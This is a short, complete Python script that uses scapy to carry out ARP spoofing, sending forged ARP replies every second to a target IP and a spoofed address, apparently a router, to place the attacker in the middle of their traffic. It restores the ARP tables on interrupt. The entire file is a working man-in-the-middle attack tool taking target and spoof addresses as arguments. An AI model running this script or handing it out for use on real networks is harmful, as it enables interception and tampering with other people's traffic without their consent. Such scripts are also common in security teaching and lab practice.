#!usr/bin/env python

import scapy.all as scapy
import argparse
import time


def get_args():
    args = argparse.ArgumentParser()
    #args.add_argument("-i", "--interface", dest="interface", help="The network interface of the attack")
    args.add_argument("-t", "--target", dest="target", help="Target IP address")
    args.add_argument("-s", "--spoof", dest="spoof", help="Spoofed IP address")
    options = args.parse_args()
    return options.target, options.spoof


def spoofer(t_ip, s_ip):
    t_mac_vict = scan(t_ip)
    t_mac_router = scan(s_ip)
    arp_resp_vict = scapy.ARP(op=2, pdst=t_ip, hwdst=t_mac_vict, psrc=s_ip)
    arp_resp_route = scapy.ARP(op=2, pdst=s_ip, hwdst=t_mac_router, psrc=t_ip)
    return arp_resp_route, arp_resp_vict


def attack(resp1, resp2, t_ip, s_ip):
    try:
        print("Commencing ARP spoofing on IP : ", t_ip)
        pcount = 0
        while True:
            scapy.send(resp1, verbose=False)
            scapy.send(resp2, verbose=False)
            pcount += 2
            print("\r[+] ", pcount, " Packets send.", end="")
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[+] CTRL + C Detected...")
        print("[+] Resetting ARP tables...Quitting!")
        reset(t_ip, s_ip)


def scan(ip):
    arp_req = scapy.ARP(pdst=ip)
    eth_req = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    request = eth_req/arp_req
    ans_list = scapy.srp(request, timeout=2, verbose=False)[0]
    return ans_list[0][1].hwsrc


def reset(t_ip, s_ip):
    t_mac_vict = scan(t_ip)
    t_mac_router = scan(s_ip)
    vict_reset = scapy.ARP(op=2, pdst=s_ip, hwdst=t_mac_router, psrc=t_ip, hwsrc=t_mac_vict)
    rout_reset = scapy.ARP(op=2, pdst=t_ip, hwdst=t_mac_vict, psrc=s_ip, hwsrc=t_mac_router)
    scapy.send(vict_reset, verbose=False)
    scapy.send(rout_reset, verbose=False)


target, spoof = get_args()
r_resp, v_resp = spoofer(target, spoof)
attack(v_resp, r_resp, target, spoof)


#attack(spoofer(get_args()[0], get_args()[1])[0], spoofer(get_args()[0], get_args()[1])[1])
